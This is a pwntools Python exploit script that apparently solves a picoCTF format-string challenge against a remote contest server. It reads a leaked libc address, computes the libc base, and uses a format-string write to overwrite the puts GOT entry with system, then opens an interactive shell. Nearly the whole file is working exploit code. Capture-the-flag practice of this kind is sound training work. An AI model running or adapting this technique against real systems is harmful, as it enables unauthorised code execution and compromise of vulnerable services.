#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
        # r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 64607)

    return r

r = conn()

def send_payload(payload):
    log.info(f"{repr(payload)=}")
    r.sendline(payload)

def main():

    # Happily accept the libc setvbuf address leak and use it to find the libc base addr
    r.recvuntil(b'libc: ')
    setvbuf_addr = int(r.recvline().strip().decode()[2:], 16)
    libc.address = setvbuf_addr - libc.symbols.setvbuf

    fmtstr = FmtStr(execute_fmt=send_payload, offset=38)
    fmtstr.write(exe.got.puts, libc.symbols.system)
    fmtstr.execute_writes()

    
    r.interactive()


if __name__ == "__main__":
    main()
